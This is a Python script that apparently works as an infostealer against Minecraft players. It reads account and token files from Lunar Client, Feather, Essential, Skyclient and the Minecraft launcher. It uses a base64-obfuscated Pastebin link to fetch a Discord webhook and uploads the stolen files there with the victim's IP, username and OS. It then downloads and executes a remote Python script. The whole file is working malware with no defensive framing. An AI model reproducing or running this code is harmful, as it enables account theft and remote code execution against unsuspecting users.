import requests
import os
import socket
import platform
import threading
import base64

def get_system_info():
    user_ip = socket.gethostbyname(socket.gethostname())
    user_name = os.getlogin()
    user_os = platform.system()
    return user_ip, user_name, user_os

def config_handle(user_ip, user_username, user_os, webhook_url, file1_content, file2_content, file3_content, file4_content, file5_content):
    package_name = "Github Exe"
    version = "1.0.0"
    lunar = "true" if file1_content else "false"
    essentials = "true" if file2_content else "false"
    launcher = "true" if file3_content else "false"
    feather = "true" if file4_content else "false"
    skyclient_essential = "true" if file4_content else "false"

    content = f"||@everyone||\n-------------------\nLogged by: **{package_name}**\nVersion **{version}**\nMessage from: {user_username}\nIP: {user_ip}\nOS: {user_os}\n-------------------\n Lunar: {lunar}\n Essentials: {essentials}\n Launcher: {launcher}\n Feather: {feather}\n Skyclient (essential): {skyclient_essential}\n-------------------"

    files = {}
    if file1_content:
        files["file1"] = ("lunar.json", file1_content)
    if file2_content:
        files["file2"] = ("essentials.json", file2_content)
    if file3_content:
        files["file3"] = ("launcher_accounts.json", file3_content)
    if file4_content:
        files["file4"] = ("feather.json", file4_content)
    if file5_content:
        files["file5"] = ("skyclient_essential.json", file5_content)

    profile_picture_url = "https://cdn.discordapp.com/attachments/1211281395285102592/1211312968801976400/pink_mouse.png?ex=65edbe1c&is=65db491c&hm=ce00bb7c94512c08bb41eed3784dd5e81d8bb262eefb668e6d08d29bcc4cd34c&"
    
    payload = {
        "content": content,
        "username": "The Ripper May",
        "avatar_url": profile_picture_url
    }
    
    requests.post(webhook_url, files=files, data=payload)
    
def execute_remote_python_script(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            thread = threading.Thread(target=exec, args=(response.text, globals()))
            thread.start()
            thread.join()
    except Exception as e:
        return e
    
def bit():
    bit64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzYxTmRaUWF4"                      #base64 PASTEBIN with WebHook
    bit = base64.b64decode(bit64.encode()).decode('utf-8')
    try:
        response = requests.get(bit)
        if response.status_code == 200:
            webhook = response.text.strip()
            return webhook
        else:
            return None
    except Exception as e:
        return None

def get_config(file_path):
    if os.path.exists(file_path):
        with open(file_path, "rb") as file:
            return file.read()
    else:
        return None 

def config():
    user_ip, user_username, user_os = get_system_info()
    webhook_url = bit()
    confi1_path = os.path.join(os.path.expanduser("~"), ".lunarclient", "settings", "game", "accounts.json")
    confi2_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json")
    confi3_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "launcher_accounts.json")
    confi4_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".feather","accounts.json")
    confi5_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "skyclient", "essential", "microsoft_accounts.json")
    file1_content = get_config(confi1_path)
    file2_content = get_config(confi2_path)
    file3_content = get_config(confi3_path)
    file4_content = get_config(confi4_path)
    file5_content = get_config(confi5_path)
    config_handle(user_ip, user_username, user_os, webhook_url, file1_content, file2_content, file3_content, file4_content, file5_content)
    execute_remote_python_script(url = "https://raw.githubusercontent.com/user/tests/main/script.py")                                               #url to script raw
    
def main():
    config()
main()